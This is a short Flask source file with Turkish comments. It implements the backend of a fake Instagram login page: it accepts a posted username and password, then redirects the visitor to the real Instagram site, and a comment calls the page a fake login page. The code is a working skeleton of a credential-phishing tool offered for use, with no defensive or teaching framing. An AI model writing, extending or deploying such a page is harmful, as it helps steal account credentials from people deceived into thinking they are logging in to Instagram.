from flask import Flask, render_template, request, redirect

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/giris-kontrol', methods=['POST'])
def giris_kontrol():
    username = request.form['username']
    password = request.form['password']
    # Burada kullanıcı adı ve şifreyi kontrol edebilirsin, veya istediğin işlemi yapabilirsin.
    return redirect('https://www.instagram.com/') # Sahte giriş sayfasından gerçek Instagram'a yönlendir.

if __name__ == '__main__':
    app.run(debug=True)
  
